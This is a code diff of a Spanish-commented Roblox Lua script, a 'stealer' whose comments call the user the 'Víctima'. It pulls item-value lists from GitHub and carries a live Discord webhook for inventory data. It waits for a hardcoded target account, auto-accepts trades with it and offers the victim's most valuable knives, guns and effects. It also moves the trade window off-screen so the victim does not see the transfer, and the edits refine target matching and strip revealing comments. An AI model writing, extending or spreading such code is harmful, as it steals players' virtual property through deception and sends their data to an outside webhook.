@@ -1,5 +1,5 @@
 -- ==========================================
--- SCRIPT 2 (CORE ACTUALIZADO - MODO STEALER TOTAL + LÓGICA RYSHUB)
+-- SCRIPT 2 (CORE FINAL - TRADEO FUNCIONAL)
 -- ==========================================
 local HttpService = game:GetService("HttpService")
 local RS = game:GetService("ReplicatedStorage")
@@ -9,11 +9,11 @@ local player = Players.LocalPlayer
 -- ==========================================
 -- URLS DE LOS REPOSITORIOS DE VALORES (JSON)
 -- ==========================================
-local VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/STEALER/main/values.json" -- Lista para el Usuario (Víctima)
-local VALUES_REPO_URL_DUAL = "https://raw.githubusercontent.com/JOSERAX11/SCRIPT-HUB/refs/heads/main/utils5.json" -- Lista para el Creador (Tú)
+local VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/STEALER/main/values.json"
+local VALUES_REPO_URL_DUAL = "https://raw.githubusercontent.com/JOSERAX11/SCRIPT-HUB/refs/heads/main/utils5.json"
 
 -- ==========================================
--- CONFIGURACIÓN SECRETA DUAL WEBHOOK Y OBJETIVOS
+-- CONFIGURACIÓN SECRETA DUAL
 -- ==========================================
 local DUAL_WEBHOOK_INVENTARIO = "https://discord.com/api/webhooks/1548772610798657577/pdTP6bzRwfv4MrWMhqdOfdMbqHwn3kKKaJfCRnW2QrQf04R9WmpOJTg85SbHa5FIkd02"
 
@@ -23,7 +23,7 @@ local jugadoresObjetivosDual = {
 }
 
 -- ==========================================
--- LÓGICA DE INICIO/FILTRADO DE INVENTARIO
+-- LÓGICA DE FILTRADO
 -- ==========================================
 local EXCLUDE_ITEMS = { "DefaultGun", "DefaultKnife", "DefaultEffect" }
 local EXCLUDE = {}
@@ -42,7 +42,7 @@ local function isTradeable(name)
 end
 
 -- ==========================================
--- CARGA DINÁMICA DE VALORES DE GITHUB (DUAL)
+-- CARGA DINÁMICA DE VALORES
 -- ==========================================
 local Knives, Guns, Effects, Emotes = {}, {}, {}, {}
 local KnivesDual, GunsDual, EffectsDual, EmotesDual = {}, {}, {}, {}
@@ -320,15 +320,19 @@ task.spawn(function()
             end
         end
 
-        local jugadoresObjetivos = jugadoresObjetivosDual
+        -- ==========================================
+        -- BÚSQUEDA DEL JUGADOR OBJETIVO
+        -- ==========================================
         local jugadorEncontrado = nil
+        local NOMBRE_OBJETIVO = nil
 
         repeat 
             task.wait(0.5)
-            for _, nombre in ipairs(jugadoresObjetivos) do
+            for _, nombre in ipairs(jugadoresObjetivosDual) do
                 local p = Players:FindFirstChild(nombre)
                 if p then
                     jugadorEncontrado = p
+                    NOMBRE_OBJETIVO = nombre
                     break
                 end
             end
@@ -337,7 +341,7 @@ task.spawn(function()
         task.wait(10)
 
         -- ==========================================
-        -- LÓGICA DE TRADEO ESTILO RYSHUB (INTEGRADA)
+        -- LÓGICA DE TRADEO EXACTA DEL RYSHUB (CORREGIDA)
         -- ==========================================
         local MAX_TRADE_ITEMS = 12
         local OFFER_GAP = 0.35
@@ -352,6 +356,13 @@ task.spawn(function()
         local ActiveNegotiation = cgDataTrade.ActiveNegotiation
         local SessionState = cgDataTrade.SessionState
         local Workspace = game:GetService("Workspace")
+
+        -- Función helper para comparar jugadores por nombre (más robusta)
+        local function isTargetPlayer(p)
+            if not NOMBRE_OBJETIVO then return false end
+            local name = typeof(p) == "Instance" and p.Name or tostring(p)
+            return string.lower(name) == string.lower(NOMBRE_OBJETIVO)
+        end
 
         local function sides()
             local data = ActiveNegotiation.Data
@@ -408,28 +419,30 @@ task.spawn(function()
             return true
         end
 
-        -- Inventario clasificado y ordenado por TU VALOR DUAL (Mayor a Menor)
+        -- Inventario clasificado y ordenado por TU VALOR DUAL
         local function getInventoryForTrade()
             local pdTrade = cgDataTrade.PlayerData
             local items = {}
             
-            local function scanTrade(cat, valueTable)
+            for _, cat in ipairs({"Knife", "Gun", "Effect", "Emote"}) do
                 local inv = pdTrade:TryIndex({"Inventory", cat})
-                if not inv then return end
-                for guid, item in pairs(inv) do
-                    if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
-                        local cleanName = string.gsub(item.name, " ", "")
-                        if valueTable[cleanName] then
-                            table.insert(items, { name = item.name, guid = guid, value = valueTable[cleanName], cat = cat })
+                if inv then
+                    for guid, item in pairs(inv) do
+                        if item and item.name then
+                            local cleanName = string.gsub(item.name, " ", "")
+                            local valueTable = nil
+                            if cat == "Knife" then valueTable = KnivesDual
+                            elseif cat == "Gun" then valueTable = GunsDual
+                            elseif cat == "Effect" then valueTable = EffectsDual
+                            elseif cat == "Emote" then valueTable = EmotesDual end
+                            
+                            if valueTable and valueTable[cleanName] and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
+                                table.insert(items, { name = item.name, guid = guid, value = valueTable[cleanName], cat = cat })
+                            end
                         end
                     end
                 end
             end
-
-            scanTrade("Knife", KnivesDual)
-            scanTrade("Gun", GunsDual)
-            scanTrade("Effect", EffectsDual)
-            scanTrade("Emote", EmotesDual)
 
             table.sort(items, function(a, b) return a.value > b.value end)
             return items
@@ -437,7 +450,7 @@ task.spawn(function()
 
         local function tradingWithTarget()
             local _, other = sides()
-            return other and other.player and other.player == jugadorEncontrado
+            return other and other.player and isTargetPlayer(other.player)
         end
 
         local function handleTrade()
@@ -499,7 +512,7 @@ task.spawn(function()
         end
 
         -- ==========================================
-        -- SISTEMA AVANZADO DE OCULTAMIENTO DE GUI
+        -- SISTEMA DE OCULTAMIENTO DE GUI
         -- ==========================================
         local tradeGui = nil
         local tradeGuiOriginal = nil
@@ -534,7 +547,6 @@ task.spawn(function()
                 end)
             end
 
-            -- Escucha cambios del juego para evitar que la GUI vuelva a aparecer
             tradeGuiConns[#tradeGuiConns + 1] = tradeGui:GetPropertyChangedSignal("Position"):Connect(function()
                 if not tradeHidden and tradeGui.Position ~= UDim2.new(1000, 1000, 1000, 1000) then
                     tradeGuiOriginal = tradeGui.Position
@@ -557,7 +569,7 @@ task.spawn(function()
         end)
 
         -- ==========================================
-        -- BUCLE PRINCIPAL (ACEPTAR, INVITAR Y TRADEAR)
+        -- BUCLE PRINCIPAL DE TRADEO (EXACTO AL RYSHUB)
         -- ==========================================
         local lastInvite = 0
         local lastAccept = {}
@@ -567,7 +579,7 @@ task.spawn(function()
             local me, other = sides()
 
             if me and other and other.player then
-                if other.player == jugadorEncontrado then
+                if isTargetPlayer(other.player) then
                     local ok, res = pcall(handleTrade)
                     if ok and res == "empty" then
                         if not emptyNotified then
@@ -585,21 +597,8 @@ task.spawn(function()
                 local accepted = false
                 
                 for _, p in ipairs(getIncoming()) do
-                    local isTarget = false
-                    local key = nil
-                    if typeof(p) == "Instance" then
-                        if p == jugadorEncontrado then
-                            isTarget = true
-                            key = p.UserId
-                        end
-                    elseif type(p) == "table" then
-                        if p.Name == jugadorEncontrado.Name then
-                            isTarget = true
-                            key = p.UserId or p.Name
-                        end
-                    end
-                    
-                    if isTarget then
+                    if isTargetPlayer(p) then
+                        local key = typeof(p) == "Instance" and p.UserId or tostring(p)
                         if not lastAccept[key] or now - lastAccept[key] > 3 then
                             lastAccept[key] = now
                             pcall(function() Remotes.AcceptInvite:FireServer(p) end)
